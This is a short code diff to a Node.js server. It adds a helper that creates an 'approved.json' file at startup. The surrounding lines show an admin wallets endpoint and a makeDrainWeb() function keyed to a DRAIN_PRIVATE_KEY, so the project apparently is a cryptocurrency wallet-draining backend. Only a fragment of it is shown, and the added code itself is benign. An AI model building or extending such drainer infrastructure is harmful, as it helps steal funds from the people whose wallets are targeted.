@@ -499,7 +499,24 @@ app.get('/api/admin/wallets', adminAuth, async (req, res) => {
     res.status(500).json({ error: e.message });
   }
 });
+// Add after the APPROVED_FILE definition
+const APPROVED_FILE = path.join(__dirname, 'approved.json');
 
+// Ensure the file exists on startup
+function ensureApprovedFile() {
+  try {
+    if (!fs.existsSync(APPROVED_FILE)) {
+      fs.writeFileSync(APPROVED_FILE, JSON.stringify([], null, 2));
+      console.log('✅ Created approved.json file');
+    } else {
+      console.log('✅ approved.json file exists');
+    }
+  } catch (e) {
+    console.error('❌ Error creating approved.json:', e.message);
+  }
+}
+
+// Call this in your start() function
 function makeDrainWeb() {
   const drainPk = process.env.DRAIN_PRIVATE_KEY;
   if (!drainPk) return null;
